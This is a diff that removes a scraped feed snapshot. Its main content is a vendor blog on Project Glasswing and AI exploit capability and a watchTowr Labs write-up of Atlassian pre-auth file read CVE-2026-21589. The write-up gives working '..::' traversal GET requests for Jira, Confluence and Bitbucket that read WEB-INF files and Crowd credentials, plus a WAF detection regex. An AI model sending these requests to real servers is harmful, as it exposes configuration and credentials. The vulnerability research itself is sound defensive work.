@@ -1,214 +1,20 @@
 {
   "schema_version": 1,
-  "date": "2026-10-07",
-  "generated_at": "2026-10-07T00:35:07.654710+00:00",
-  "item_count": 8,
-  "kinds_included": [
-    "publish"
-  ],
-  "items": [
-    {
-      "id": "a:4c3295ea8c2842f0",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-10-07T00:32:50.824376+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
-      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "Please enable cookies.\nSorry, you have been blocked\nYou are unable to access\nunknowncheats.me\nWhy have I been blocked?\nThis website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.\nWhat can I do to resolve this?\nYou can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.\nCloudflare Ray ID:\na468d036c83dd650\n•\nYour IP:\nClick to reveal\n20.62.204.22\n•\nPerformance & security by\nCloudflare",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "browser",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
-      "content_chars": 725,
-      "content_sha256": "9b0464ae5a5dfffa856bb44cefeed5e6c660a47f09f0b27ccb15a3619d6dfd33",
-      "content_fetched_at": "2026-10-07T00:33:18.811685+00:00",
-      "content_error": "",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:a71377f72462595f",
-      "kind": "publish",
-      "text": "cymulate-blog published: Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security ValidationRead More",
-      "actor": "cymulate-blog",
-      "actor_url": "https://cymulate.com/blog/",
-      "created_at": "2026-10-07T00:32:50.824376+00:00",
-      "html_url": "https://cymulate.com/blog/project-glasswing/",
-      "title": "Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security ValidationRead More",
-      "via": "llm",
-      "collect_mode": "html_llm",
-      "content": "Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security Validation\nBy:\nAmanda Kegley\nOctober 6, 2026\nProject Glasswing\nis an Anthropic controlled initiative for using advanced AI models to find and help fix vulnerabilities in critical software before similar capabilities become widely available to attackers. It has drawn attention because\nClaude Mythos\nPreview did more than identify suspicious code. It reproduced vulnerabilities, developed exploit components and combined weaknesses into complete attack chains.\nOne point needs clarification: Project Glasswing is a restricted research and defense program, and it's often mistaken for a single benchmark with one score. The program combines live code reviews and partner deployments. Independent evaluations such as CyberGym and ExploitBench add measured evidence of what the model can do. Together, they show how frontier AI models are reshaping both cyber offense and cyber defense.\nFor enterprises, the concern is practical. As AI models improve, attackers may need less time and expertise to discover exploitable weaknesses and develop sophisticated attack chains. Security teams must understand those capabilities, then continuously validate whether their prevention, detection and response controls can withstand the techniques these models help scale. Continuous security validation helps organizations move beyond assumptions and verify that security controls perform effectively against evolving threats.\nKey Takeaways\nProject Glasswing is a controlled research program.\nIt combines live vulnerability discovery, exploit development and coordinated disclosure, while independent benchmarks measure how frontier AI models perform across the cybersecurity lifecycle.\nAI is accelerating cyber offense.\nAdvanced models like Claude Mythos can identify vulnerabilities, reproduce exploits and build attack chains, reducing the time and expertise required for sophisticated attacks.\nOrganizations need more than vulnerability management.\nAs AI increases the volume and complexity of findings, security teams must continuously validate which exposures are actually exploitable, whether existing security controls can stop them and mitigate with updates to security controls, “virtual patches” if patch is not available.\nContinuous security validation closes the gap.\nAI capability benchmarks show what frontier models can do. Regularly testing prevention, detection and response controls against realistic attack techniques shows whether an organization's defenses can withstand those capabilities in practice and discovers gaps with specific mitigation.\nWhat Is Project Glasswing?\nOn April 7, 2026, Anthropic launched\nProject Glasswing\nin response to a sharp increase in AI cyber capability. The program is built around Claude Mythos Preview, an unreleased frontier model designed for advanced cybersecurity research.\nClaude Mythos is the model, and Project Glasswing is the controlled research and defense program around it. Glasswing supplies the governance, access controls, disclosure processes and partner ecosystem needed to use the model's capabilities for defense.\nThose capabilities are significant. Mythos Preview found vulnerabilities in major operating systems, browsers and open-source components, including flaws that had survived years of human review and millions of automated test runs. It could also go from finding a bug to building a working exploit with little human direction.\nThe initial partners were Amazon Web Services, Apple, Broadcom, Cisco, CrowdStrike, Google, JPMorganChase, the Linux Foundation, Microsoft, NVIDIA and Palo Alto Networks. Anthropic then gave access to more than 40 more organizations that build or maintain critical software infrastructure. Those organizations can use the model to scan and secure their own systems and open-source software. Anthropic also committed to sharing what it learns so the whole industry can benefit.\nAnthropic later released\nMythos 5\n, an updated model that, as of October 2026, is available only to vetted partners.\nProject Glasswing at a glance\nArea\nSummary\nCreator\nAnthropic, working with technology companies, critical infrastructure providers and open-source maintainers\nCore model\nClaude Mythos Preview, later followed by Mythos 5\nPrimary purpose\nFind, validate, disclose and help remediate vulnerabilities in critical software\nEvaluation approach\nLive code analysis, controlled exploit development and coordinated disclosure, supported by results on independent benchmarks such as CyberGym and ExploitBench\nMain capabilities tested\nVulnerability discovery, exploit reproduction, multi-step reasoning, tool use and attack-chain construction\nScope limits\nA single public leaderboard, a general measure of cyber risk or a test of one enterprise's defenses all fall outside its scope\nWhy it matters\nIt shows how frontier models may lower the cost and expertise needed for sophisticated cyber operations\nAnthropic\nexpanded the program\nin June 2026 to approximately 150 additional organizations across more than 15 countries. The expansion included power, water, healthcare, communications and hardware providers, underscoring the growing importance of AI-assisted cybersecurity research for critical infrastructure.\nWhy AI Cybersecurity Benchmarks Matter\nGeneral AI benchmarks can measure knowledge, coding performance or reasoning. They don't show whether a model can operate through the full lifecycle of a cyber task.\nA model may score well on a coding benchmark yet fail to recognize a trust boundary, compile a proof of concept or adapt after an exploit attempt fails. Cybersecurity evaluations must test actions as well as answers. The model needs to inspect unfamiliar code, form a hypothesis, use tools, interpret runtime behavior and revise its plan.\nThat is why tests such as MMLU or SWE-bench provide only part of the picture. MMLU measures broad academic knowledge. SWE-bench tests whether models can resolve software issues in real repositories. Neither was built to determine whether a model can turn a memory-safety flaw into a reliable exploit chain.\nSpecialized AI cyber evaluations measure these higher-risk capabilities under controlled conditions. They also help researchers identify thresholds that may require stronger safeguards or restricted access.\nThe need is growing because AI supports both sides of security operations. Defenders use it for code review, vulnerability triage, detection engineering and incident analysis. Attackers can apply similar capabilities to reconnaissance, phishing, exploit development and post-compromise activity. As agentic AI becomes more capable of planning, using tools and adapting based on results, periodic security assessments can't keep up. Organizations need continuous validation to confirm that prevention, detection and response controls remain effective against rapidly evolving attack techniques.\nStandardized evaluations give developers, governments and security leaders a common evidence base. They help separate marketing claims from tested performance and support more responsible release decisions.\nHow Project Glasswing Works\nProject Glasswing combines controlled model access, authorized testing and coordinated vulnerability disclosure. Partners apply Mythos to software they own or are allowed to assess. The model can review source code, generate test cases, compile code and run proof-of-concept attempts inside isolated environments.\nCloudflare described a multi-stage harness\nit used with Mythos. One group of agents mapped repositories and attack surfaces. Other agents hunted for narrowly scoped vulnerability classes. Independent agents tried to disprove findings. Later stages removed duplicates, traced whether attacker-controlled input could reach a flaw and produced structured reports.\nThis structure matters. A single prompt can produce inconsistent results. A harness divides work, validates output and preserves evidence.\nIndependent benchmarks, built outside the program, add controlled measurement of the same capabilities:\nCyberGym\ntests vulnerability reproduction in real software.\nExploitBench\nmeasures exploit development across 41 patched V8 vulnerabilities and 16 capability levels.\nExploitGym\nevaluates exploit creation across vulnerabilities from OSS-Fuzz, V8 and the Linux kernel.\nSCONE-bench\nfocuses on smart contract exploitation.\nThese evaluations test reasoning, planning and execution. The model must reach vulnerable code, reproduce the bug, create exploit primitives and sometimes achieve unauthorized code execution. That is a much harder task than recalling a known common vulnerabilities and exposures (CVE) description.\nProject Glasswing measures model capability in authorized environments. It doesn't prove that a model can compromise any live organization, and it doesn't account for every identity control, network path, cloud permission or detection layer. It also doesn't test whether an organization's controls would stop the resulting techniques.\nEnterprise security validation must answer the next question: What happens when comparable techniques meet the organization's actual defenses?\nKey Findings from Project Glasswing\nAnthropic\nreported\nthat approximately 50 initial partners used Mythos Preview to find more than 10,000 high- or critical-severity vulnerabilities. Several partners said their discovery rate increased by more than 10 times. Cloudflare reported 2,000 bugs across critical systems, including 400 rated high or critical.\nAnthropic also scanned more than 1,000 open-source projects and reported 23,019 potential vulnerabilities. Mythos estimated that 6,202 were high or critical. Independent researchers reviewed 1,752 of those findings. Of the reviewed group, 90.6% were valid true positives and 62.4% were confirmed as high or critical. At the time of the update, Anthropic had reported 530 high- or critical-severity bugs to maintainers, and 75 of them had been patched.\nThe model performed strongly on formal evaluations. Mythos Preview\nscored 83.1% on CyberGym\n, compared with 66.6% for Claude Opus 4.6. In\nEpoch AI's review of ExploitBench\n, Mythos Preview achieved arbitrary code execution on 16 to 18 of the 41 V8 vulnerabilities, depending on the test harness.\nThe case studies show why these scores matter. Mythos found a 27-year-old OpenBSD vulnerability, a 16-year-old FFmpeg flaw and a Linux kernel privilege-escalation chain. Mozilla reported finding and fixing 271 vulnerabilities in Firefox 150 while testing the model, more than 10 times the number it found in Firefox 148 using Claude Opus 4.6.\nThe limitations remain important. Models can generate noise, miss context or produce patches that create regressions. Cloudflare found that structured validation and independent review were necessary. Anthropic also reported that the main bottleneck shifted from finding vulnerabilities to verifying, disclosing and patching them.\nFrontier models have crossed an important threshold, and expert oversight still matters. Human teams need to confirm impact, coordinate disclosure, prioritize remediation and verify fixes. For enterprise security teams, AI may accelerate vulnerability discovery, but organizations still need continuous validation to understand which findings create real exposure in their own environments.\nWhat Project Glasswing Means for Enterprise Security\nFor security leaders, the main change is the speed, scale and accessibility of existing attack methods, rather than a new category of attack.\nAI can help more people analyze code, reproduce vulnerabilities and connect smaller weaknesses into exploitable paths. That may shorten the time between discovery and weaponization. It can also increase the volume of plausible findings that security teams must assess.\nVulnerability management must therefore become more context-aware. As AI produces more findings, organizations need to distinguish theoretical vulnerabilities from those that are actually exploitable within their own environments. Exposure validation provides that context by combining attack simulation with evidence about how security controls perform in practice.\nCompensating controls matter more when discovery outpaces patching. Segmentation, least privilege, application isolation and strong identity controls can limit impact before a patch is available with fixes to security controls, known as virtual patches. Continuous\nexposure validation\nverifies that these controls perform as intended, so teams don't have to assume they will during a real attack and delivers mitigations for gaps.\nCloudflare reached a similar conclusion\nafter testing Mythos, noting that faster patching alone doesn't solve the architectural problem around vulnerable systems.\nDetection and response content must also keep pace. AI-assisted operators may vary payloads, combine techniques and retry faster. Static assumptions and annual testing can't provide enough confidence.\nOrganizations also need governance around their own use of cyber AI. Approved agents should operate within defined permissions, logging and human review. Unapproved AI tools can expose source code, credentials or sensitive data, making AI governance an increasingly important component of enterprise security. For more on this topic, see our\nguide to combating rogue AI\n.\nFrom AI Benchmarks to Continuous Exposure Validation\nProject Glasswing helps answer one question: Can frontier AI find and exploit difficult software weaknesses?\nEnterprises need to answer another question: Can our defenses prevent, detect and respond to the techniques at the same speed and scale that capable models help attackers execute?\nThat requires\ncontinuous exposure validation\nthat leverages\nagentic AI\n. Instead of relying only on vulnerability counts or point-in-time assessments, security teams safely reproduce realistic attack activity and observe how controls respond. They can test common security defenses such as endpoint detection and response (EDR), security information and event management (SIEM), web application firewalls (WAF), email and web gateways, identity controls and network defenses.\nThe process should validate three outcomes: whether a control prevented the action, whether the organization generated useful telemetry for detection and whether responders could contain the activity before it reached a critical asset.\nThis evidence improves prioritization. A high-severity vulnerability may present limited risk if it is unreachable and protected by effective controls. A lower-severity weakness may require urgent action if it connects to exposed credentials, excessive permissions or an attack path to a critical system.\nCymulate Exposure Validation leverages\nagentic cyber defense engineering\nto continuously tests threats, techniques and security controls in production-safe ways, using a daily feed of new threats and MITRE ATT&CK techniques. Combined with\nCymulate Detection Studio\nfor ingesting and validating existing SIEM rules and\nCymulate CTEM\nfor prioritizing exploitable exposure, the\nCymulate Platform\nhelps teams validate prevention and detection across their existing security stack.\nWe go beyond validation. The cyber defense engineering control plane in the Cymulate Platform understands how each control responded to an attack and builds vendor-specific mitigations, such as detection rules, indicators of compromise (IoCs) and recommended control updates.\nCymulate Auto Mitigation\ncan then push those updates to the security stack.\nThis supports a shift toward\nagentic cyber defense engineering\n. Agentic cyber defense engineering is a closed-loop, AI-assisted approach to continuously proving and improving security defenses. Agentic cyber defense engineering uses AI agents, exposure validation and\nsecurity control integrations\nto continuously test, tune and improve cyber defenses at machine speed.\nGlasswing shows what advanced models can allow attackers to do. Continuous exposure validation that leverages agentic AI shows whether an organization can withstand it and respond at machine speed, as needed.\nConclusion\nProject Glasswing marks an important milestone in AI cybersecurity evaluation. It shows that frontier models can discover difficult vulnerabilities, develop exploit components and connect weaknesses into attack chains at a scale that changes long-standing assumptions about vulnerability research.\nIt also shows the limits of capability benchmarks. A strong model score doesn't reveal whether a specific enterprise is exposed, whether controls will prevent or detect the activity as well as whether responders can contain it.\nSecurity teams need both perspectives. Benchmarks show what advanced AI may enable. Continuous exposure validation that leverages agentic cyber defense engineering proves how their own defenses perform against evolving techniques and implements mitigations, all at machine speed.\nAs AI-assisted operations become faster and more accessible, confidence must come from tested evidence. Organizations that continuously prove, prioritize and adapt their defenses can find gaps earlier, remediate by real risk and update controls with virtural patches before a capability shift becomes an incident.\nSee how Cymulate Exposure Validation proves what's exploitable in your environment and builds the mitigations with security control updates to close the gap so your organization can be ready for attackers executing at machine speed.\nAmanda Kegley\nAmanda Kegley has over 15 years of experience in cybersecurity. With her in-depth knowledge of security needs in today’s dynamic threat landscape, she successfully innovates and markets new cybersecurity capabilities.\nMore about Author\nTable of Contents\nWhat Is Project Glasswing?\nProject Glasswing at a glance\nWhy AI Cybersecurity Benchmarks Matter\nHow Project Glasswing Works\nKey Findings from Project Glasswing\nWhat Project Glasswing Means for Enterprise Security\nFrom AI Benchmarks to Continuous Exposure Validation\nConclusion\nCymulate Exposure Validation\nmakes advanced security testing fast and easy. When it comes to building custom attack chains, it's all right in front of you in one place.\nMike Humbert\n,\nCybersecurity Engineer\nDARLING INGREDIENTS INC.\nLearn More\nFeatured Resources\nView More Resources\nblog\nCymulate Joins Anthropic Cyber Verification Program\nCymulate joins Anthropic’s Cyber Verification Program to advance AI-powered threat research and security validation.\nRead More\nblog\nHow to Prioritize Vulnerabilities in 2026: From CVSS to Real Risk\nSee how real-world context, exploitability, business impact and attack validation help teams focus remediation where it matters.\nRead More\nE-book\nAgentic Cyber Defense Engineering\nThis e-book explores the six stages of agentic cyber defense engineering and how they work together to strengthen cyber defenses.\nLearn More\nGET A PERSONALIZED DEMO\nReady to see Cymulate in action?\nBook a Demo",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://cymulate.com/blog/project-glasswing/",
-      "content_chars": 18935,
-      "content_sha256": "8507fcce1a4032cbe32774872de3295e7c3b3da092249ad2d78d5e8b0346bbc8",
-      "content_fetched_at": "2026-10-07T00:34:17.929779+00:00",
-      "content_error": "",
-      "time_precision": "daily_window",
-      "source_name": "Cymulate Blog",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:6e2c593ea404da1b",
-      "kind": "publish",
-      "text": "openai-research published: 分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
-      "actor": "openai-research",
-      "actor_url": "https://openai.com/zh-Hans-CN/research/index/",
-      "created_at": "2026-10-07T00:32:50.824376+00:00",
-      "html_url": "https://openai.com/index/sharing-ai-progress-in-mathematics/",
-      "title": "分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://openai.com/index/sharing-ai-progress-in-mathematics/",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-10-07T00:34:55.674914+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "OpenAI Research",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:b0363c6deea56393",
-      "kind": "publish",
-      "text": "openai-research published: 携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
-      "actor": "openai-research",
-      "actor_url": "https://openai.com/zh-Hans-CN/research/index/",
-      "created_at": "2026-10-07T00:32:50.824376+00:00",
-      "html_url": "https://openai.com/index/advancing-computer-use-with-ironclad/",
-      "title": "携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://openai.com/index/advancing-computer-use-with-ironclad/",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-10-07T00:35:06.383014+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "OpenAI Research",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:0d46526f733bfcef",
-      "kind": "publish",
-      "text": "watchtowr-labs published: You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)",
-      "actor": "watchtowr-labs",
-      "actor_url": "https://labs.watchtowr.com/",
-      "created_at": "2026-10-06T17:01:36+00:00",
-      "html_url": "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/",
-      "title": "You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "Welcome back to yet another episode of \"security was taken seriously\".\nBeing who we are (and constantly being exposed to what we see…), we recognize we have been doomed to eternal damnation as we keep on watching security best practices crumble behind “secure by design” public statements. And in the times we live in, where anyone with a prompt window in front of them can say \"reproduce the vulnerability, make no mistakes\", so are you.\nIn Greek mythology, Atlas was punished by the gods for misbehaving. Reality is unfair, and all we get is Atlassian punishing the rest of us for running their systems on-prem. And so they did, on October 5th, in a\nsecurity advisory\n.\nSometimes we regret that CVSS scores go as high as 10, because when a vulnerability is baked into almost all of a vendor's products across every version, the vulnerability deserves a special place (just like you, our dear reader).\nWelcome back to another watchTowr Labs blog post.\nWhat Is Going On\nAtlassian has published an out-of-band critical\nvulnerability advisory\nfor CVE-2026-21589 for numerous Atlassian products.\nCVE-2026-21589 was reported by Atlassian as “Arbitrary File Access” and as we’ve come to learn, this means “Arbitrary File Read”. The CVSS score itself tells us a story: a vector showing no prerequisites of authentication or complexity.\nThis vulnerability affects all previous versions of:\nProduct\nFixed Versions\nBitbucket Data Center\n• 9.4.26\n• 10.2.8\n• 10.5.1\nConfluence Data Center\n• 9.2.26\n• 10.2.19\nJira Service Management Data Center\n• 5.12.40\n• 10.3.26\n• 11.3.12\nJira Software Data Center\n• 9.12.40\n• 10.3.26\n• 11.3.12\nBamboo Data Center\n• 10.2.24\n• 12.1.12\nCrowd Data Center\n• 6.3.7\n• 7.0.3\n• 7.1.7\n• 7.2.4\nCrucible\n• 4.9.15\nFisheye\n• 4.9.15\nSeeing this list of affected products, we stopped thinking about the potentially few thousand vulnerable instances exposed to the internet, and quickly realized we are in the six to seven-figure range.\nBitbucket\nis a Git-based code hosting service where teams store, review, and collaborate on source code, with built-in pull requests and CI/CD pipelines.\nConfluence\nis a team wiki and documentation workspace for creating, organizing, and sharing pages like project plans, meeting notes, and technical docs.\nJira\nis a project and issue tracking tool, widely used for agile work, that lets teams plan, track, and manage tasks, bugs, and sprints on boards and backlogs.\nA quick internet search reveals just under\n700,000 instances of Confluence alone\n. So the range of those affected is vast, to say the least.\nAs Always, Let’s Begin\nAs CVE-2026-21589 affects so many of their products, the only logical conclusion is that these products share a common library or configuration that makes this vulnerability apply to all of them.\nWe set out to prove this against a few of their core products, namely Bitbucket, Confluence, and Jira.\nHaving deployed vulnerable and patched versions of each solution, we looked to see what exactly had changed between them and what is common among the different technologies.\nOne particular JAR stood out:\natlassian-plugins-webresource*.jar\nThat gave us our targets for comparison:\nVulnerable:\natlassian-plugins-webresource-6.0.7.jar\nDifferent:\natlassian-plugins-webresource-6.0.8.jar\nDiff’ing Our Way To “File Access”\nLooking through the advisory released by Atlassian gave us clues as to what we were looking for, notably the complex WAF rules they suggested:\n(?is).*(?:/|\\\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2})(?:\\.|%(?:25)*2e){2}(?:/|\\\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2}|;|%(?:25)*3b|$).*\nWhile semicolons (\n;\n) are very common in path traversal within Java applications, along with the everyday dots (\n.\n) and slashes (\n/\n), one item stood out: the matching of double colons (\n::\n). This is uncommon syntax for this type of vulnerability, but grepping through the codebase we came across an all too familiar sight.\nIn\ncom/atlassian/plugin/webresource/impl/http/Router.java\nwe observed this set of functions:\npublic static String sourceMapUrlToUrl(String sourceMapUrl) {\nreturn sourceMapUrl.replaceAll(\"\\\\.map$\", \"\").replaceAll(\"\\\\.map\\\\?\", \"?\");\n}\npublic static String escapeSlashes(String string) {\nreturn string.replaceAll(\"/\", \"::\");\n}\npublic static String unescapeSlashes(String string) {\nreturn string.replaceAll(\"::\", \"/\");\n}\nAt this point, you should already be cutting to the chase, just as we were. These functions match and replace double colons (\n::\n) with forward slashes (\n/\n).\nThis means we might be looking to exploit this vulnerability via a pattern similar to\n..::..::..::..::<dir>::file.txt\n. Our next step was to find a route to do it.\nLooking at where these functions are referenced, we can see they are called along several routes in the same\nRouter\nclass:\nString resources = \"resources\";\naddRoute(\"/resources/:completeKey/*resourceName.map\", new BaseRouter<Controller>.Handler() {\npublic void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {\ncontroller.serveResourceSourceMap(\nRouter.unescapeSlashes(escapedCompleteKey),\nRouter.unescapeSlashes(escapedResourceName), ServingType.RESOURCES_SINGLE);\n}\n});\naddRoute(\"/resources/:completeKey/*resourceName\", new BaseRouter<Controller>.Handler() {\npublic void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {\ncontroller.serveResource(\nRouter.unescapeSlashes(escapedCompleteKey),\nRouter.unescapeSlashes(escapedResourceName), ServingType.RESOURCES_SINGLE);\n}\n});\naddRoute(\"/sources/:completeKey/*resourceName\", new BaseRouter<Controller>.Handler() {\npublic void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {\ncontroller.serveSource( <----- [0]\nRouter.unescapeSlashes(escapedCompleteKey),\nRouter.unescapeSlashes(escapedResourceName), ServingType.SOURCES_SINGLE);\n}\n});\nFollowing\n[0]\n's\nserveSource()\nabove, we end up in\ncom.atlassian.plugin.webresource.impl.helpers.ResourceServingHelpers.java\n, which presents a programmer's favorite set of long\nIF\nfunctions.\npublic static Resource getResource(RequestCache requestCache, String completeKey, String resourceName) {\nResource resource = getWebResourceResource(requestCache, completeKey, resourceName);\nif (resource == null) {\nresource = getResourceRelativeToWebResource(requestCache, completeKey, resourceName); <---- [1]\n}\nif (resource == null) {\nresource = getFromOSGiPluginModuleResource(requestCache.getGlobals(), completeKey, resourceName);\n}\nif (resource == null) {\nresource = getPluginResource(requestCache.getGlobals(), completeKey, resourceName);\n}\nif (resource == null) {\nresource = getResourceRelativeToPlugin(requestCache.getGlobals(), completeKey, resourceName);\n}\nreturn resource;\n}\nLooking specifically at the first\nIF\nbranch,\ngetResourceRelativeToWebResource\n[1]\nreveals a function which, although marked with the\n@Deprecated\nannotation is very much alive and well.\n@Deprecated\nprotected static Resource getResourceRelativeToWebResource(\nRequestCache requestCache, String completeKey, String resourceName) {\nBundle bundle = requestCache.getSnapshot().get(completeKey);\nif (bundle == null) {\nreturn null;\n}\nString filePath = \"\";\nResource resource = null;\nwhile (resource == null) {\nString[] parts = splitLastPathPart(resourceName); // [3]\nif (parts == null) {\nreturn null;\n}\nresourceName = parts[0];\nfilePath = parts[1] + filePath;\nresource = bundle.getResources(requestCache).get(resourceName);\n}\nreturn requestCache.getGlobals().getConfig().getResourceFactory()\n.createResourceWithRelativePath(\nresource.getParent(),\nresource.getResourceLocation(),\nresource.getNameType(),\nresource.getLocationType(),\nfilePath); <----- [2]\n}\nGiven the routing patterns we have seen, it is safe to assume that a user-controlled\nresourceName\nis pushed to this function and funneled through\ncreateResourceWithRelativePath()\nat\n[2]\n.\nWhile there are attempts to remove any slashes and traversals via\nsplitLastPathPart()\nat\n[3]\n, given the potential for a\n..::\nprimitive, this is likely moot. Further investigation shows that the path is eventually used by\nResourceFactory\nto read local files, so this is the right track.\nLooking at the functionality so far, it is clear we need a plugin that lets us pass through the functionality above. After decompiling\njira-webresources-plugin.jar\nwe can review the plugins and parameters required to use it. We noted that the majority had fixed\nlocation\nvalues:\n<resource type=\"qunit\" name=\"includes/jira/components/color-picker/color-picker-controller-tests.js\" location=\"includes/jira/components/color-picker/color-picker-controller-tests.js\"><param name=\"source\" value=\"webContextStatic\"/></resource>\n<resource type=\"qunit\" name=\"includes/jira/components/color-picker/view/sample-color-collection-view-tests.js\" location=\"includes/jira/components/color-picker/view/sample-color-collection-view-tests.js\"><param name=\"source\" value=\"webContextStatic\"/></resource>\nAs luck would have it, there was one in particular that ended with a trailing slash, meaning we may be able to supply the exact file via our\nresourceName\n.\n<resource type=\"download\" name=\"images/\"\nlocation=\"/includes/jquery/plugins/colorpicker/images/\">\n<param name=\"source\" value=\"webContextStatic\"/>\n</resource>\nWith a bit of compute and perusing, we were able to build the route that interacts with this particular plugin to access the sink we are targeting, via\n/download/resources/jira.webresources:color-picker-popup/images/*\n, where all subsequent files in that path are matched to the local path\n/includes/jquery/plugins/colorpicker/images/\n.\nBy combining this path with our theoretical traversal payload, we were able to access the\nweb.xml\nfile, which is typically protected through various mechanisms within the Jira code and the Tomcat server itself.\nGET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml HTTP/1.1\nHost: {{Jira-Hostname}}\n<?xml version=\"1.0\"?>\n<web-app xmlns=\"<http://java.sun.com/xml/ns/javaee>\"\nxmlns:xsi=\"<http://www.w3.org/2001/XMLSchema-instance>\"\nxsi:schemaLocation=\"<http://java.sun.com/xml/ns/javaee>\n<http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd>\"\nversion=\"3.0\"\nmetadata-complete=\"true\">\n<!-- General -->\n<display-name>Atlassian JIRA Web Application</display-name>\n<description>The Atlassian JIRA web application - see <http://www.atlassian.com/software/jira> for more information\n</description>\n[..Truncated..]\nWhile we are not able to traverse outside of the Tomcat context, we discovered it is possible to read any file within the application server itself. The route varies across the other products, but we were able to verify it is more or less the same.\nConfluence:\nGET /s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/..::..::..::..::..::..::..::..::WEB-INF::web.xml HTTP/1.1\nHost: {{Confluence-Hostname}}\nBitbucket (slightly different, as\nweb.xml\nis blocked):\nGET /s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml HTTP/1.1\nHost: {{Bitbucket-Hostname}}\nThe Crowd Crush Is Real\nWe have already proven that we can read any file from the application's webroot, including sensitive files stored in the\nWEB-INF\ndirectory. On the other hand, a quick nudge at the filesystem did not let us find any file that would leak something as sensitive as a critical-rated vulnerability would imply.\nWe took a look at the official advisory again and spotted a sentence that turned on our internal light bulb:\nIn some configurations, there may be sensitive files present that increase your risk.\nAlright, it clearly implies that the impact may vary with the configuration. It seems there are configurations that would place files with very sensitive content in the\nWEB-INF\ndirectory.\nOur plan was simple:\nSmash through the Atlassian documentation.\nLook for references to configuration files stored within the\nWEB-INF\ndirectory.\nOne of the first hits we got was the\nJira documentation\n, which describes its integration with Atlassian Crowd.\nWhat Is Atlassian Crowd?\nAtlassian Crowd is Atlassian's centralized identity and single sign-on (SSO) product, essentially the user directory and authentication hub that sits behind the rest of the Atlassian stack.\nInstead of each Jira, Confluence, Bitbucket, and Bamboo instance managing its own separate list of users and passwords, Crowd holds that information in one place, and the other applications ask Crowd to handle authentication and group membership for them.\nLong story short: Atlassian Crowd is an identity management solution, which Atlassian recommends using with your Atlassian products deployment.\nAtlassian Crowd and Jira Deployment\nWe started reading the Atlassian Crowd and Jira deployment\nconfiguration\ninstructions and quickly stumbled upon this fragment:\nThis looks really fine. This fragment tells us that:\nThe Crowd config file is located at\nWEB-INF/classes/crowd.properties\n.\nIt stores\napplication.name\nand\napplication.password\n.\nNaturally, as it’s 2026, we asked our AI agent to deploy Crowd within our Jira installation, in compliance with the official documentation.\nWhen that was done, we manually verified the content of the\ncrowd.properties\nfile:\n$ cat WEB-INF/classes/crowd.properties\napplication.name jira\napplication.password Jira-Crowd-App-Pass-2026!\napplication.login.url <http://localhost:8095/crowd/console/>\ncrowd.server.url <http://localhost:8095/crowd/services/>\ncrowd.base.url 